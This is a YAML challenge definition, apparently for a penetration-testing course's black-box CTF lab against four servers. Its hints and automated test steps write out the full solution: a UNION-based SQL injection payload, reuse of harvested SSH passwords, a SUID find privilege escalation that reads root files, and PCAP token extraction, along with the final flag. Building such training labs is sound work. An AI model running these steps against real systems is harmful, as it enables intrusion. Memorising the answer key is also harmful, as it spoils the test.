@@ -1,0 +1,150 @@
+name: "Titan Global Industries - Black Box CTF"
+description: "Conduct a black box penetration test against Titan Global Industries. No scenario brief - find all flags across four servers using SQL injection, credential pivoting, privilege escalation, and traffic analysis."
+
+difficulty: advanced
+category: assessment
+duration_minutes: 120
+randomize_ip_offsets: true
+visibility: course
+week: 15
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/31_Black_Box_CTF/"
+flag: "OCR{t1t4n_bl4ck_b0x_pwn}"
+
+objectives:
+  - Discover and exploit a SQL injection vulnerability to extract sensitive data
+  - Enumerate web content for hidden credentials
+  - Pivot between systems using discovered credentials
+  - Escalate privileges via SUID binary exploitation
+  - Analyze network traffic captures to extract tokens
+  - Assemble all flag fragments into the final flag
+
+scenario: |
+  Titan Global Industries has contracted your red team for a black box assessment
+  of their internal infrastructure. You have been given no documentation, no
+  architecture diagrams, and no credentials. Four servers are in scope.
+
+  Your objective is simple: find all flags.
+
+  Each server contains one flag fragment. Assemble them in order to form the
+  complete flag. This is a true black box engagement - reconnaissance is your
+  first and most important step.
+
+  Good luck.
+
+credentials: []
+
+hints:
+  - text: |
+      Start by scanning all hosts in the environment. One server runs a web
+      application with a search feature. Test that search for common injection
+      vulnerabilities. Another server has a web page - always view the source.
+    unlock_after_minutes: 30
+  - text: |
+      The web app on server-alpha uses a SQL backend. Try UNION-based injection
+      on the search endpoint to enumerate tables and extract data. On server-bravo,
+      HTML comments sometimes contain useful information. After gaining SSH access,
+      look for other user accounts and their files. The sysadmin user has notes
+      about other systems in their home directory.
+    unlock_after_minutes: 50
+  - text: |
+      server-alpha: /search?q=' UNION SELECT 1,flag_value,3,4 FROM secrets-- -
+      server-bravo: HTML comment has SSH creds. Pivot from contractor to sysadmin
+      using creds in project_notes.txt. Token 2 in /home/sysadmin/marker.txt.
+      Check sysadmin's .ssh/config for charlie creds.
+      server-charlie: SUID find binary - use find /root -name flag.txt -exec cat {} ;
+      After privesc, check /opt/titan/credentials.txt for delta creds.
+      server-delta: Use tshark or strings on the PCAP to find the token.
+    unlock_after_minutes: 70
+
+topology:
+  nodes:
+    - id: "server-alpha"
+      label: "Server Alpha"
+      type: "server"
+      ip_offset: "11"
+      ports: [80]
+      services: ["Flask"]
+      x: 1
+      y: 1
+    - id: "server-bravo"
+      label: "Server Bravo"
+      type: "server"
+      ip_offset: "27"
+      ports: [22, 80]
+      services: ["OpenSSH", "nginx"]
+      x: 3
+      y: 1
+    - id: "server-charlie"
+      label: "Server Charlie"
+      type: "server"
+      ip_offset: "41"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 5
+      y: 1
+    - id: "server-delta"
+      label: "Server Delta"
+      type: "server"
+      ip_offset: "55"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 7
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "server-alpha"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "server-bravo"
+      label: "HTTP:80, SSH:22"
+      access: "direct"
+    - from: "attacker"
+      to: "server-charlie"
+      label: "SSH:22"
+      access: "direct"
+    - from: "attacker"
+      to: "server-delta"
+      label: "SSH:22"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SQL injection on server-alpha extracts token 1"
+      command: "curl -s 'http://{target.server-alpha}/search?q=%27%20UNION%20SELECT%201%2Cflag_value%2C3%2C4%20FROM%20secrets--%20-' | grep -o 't1t4n'"
+      expect: "t1t4n"
+      timeout: 15
+
+    - name: "Find SSH credentials in server-bravo HTML source"
+      command: "curl -s http://{target.server-bravo}/ | grep -o 'contractor / T1t4n_C0ntr4ct#'"
+      expect: "contractor / T1t4n_C0ntr4ct#"
+      timeout: 10
+
+    - name: "SSH to server-bravo as contractor and pivot to sysadmin for token 2"
+      command: "sshpass -p 'T1t4n_Sys_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.server-bravo} 'cat /home/sysadmin/marker.txt' 2>/dev/null"
+      expect: "bl4ck"
+      timeout: 15
+
+    - name: "SSH to server-charlie as operator"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'whoami' 2>/dev/null"
+      expect: "operator"
+      timeout: 15
+
+    - name: "SUID find exploit to read token 3 from /root/flag.txt"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /root -name flag.txt -exec cat {} \\;' 2>/dev/null"
+      expect: "b0x"
+      timeout: 15
+
+    - name: "Read analyst credentials from server-charlie"
+      command: "sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /opt/titan -name credentials.txt -exec cat {} \\;' 2>/dev/null | grep -o 'T1t4n_4n4lyst#'"
+      expect: "T1t4n_4n4lyst#"
+      timeout: 15
+
+    - name: "SSH to server-delta and extract token 4 from PCAP"
+      command: "sshpass -p 'T1t4n_4n4lyst#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null analyst@{target.server-delta} 'strings /home/analyst/evidence/traffic.pcap | grep -o \"token=pwn\" | head -1 | sed \"s/token=//\"' 2>/dev/null"
+      expect: "pwn"
+      timeout: 15
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{t1t4n_bl4ck_b0x_pwn}'"
+      expect: "OCR{"
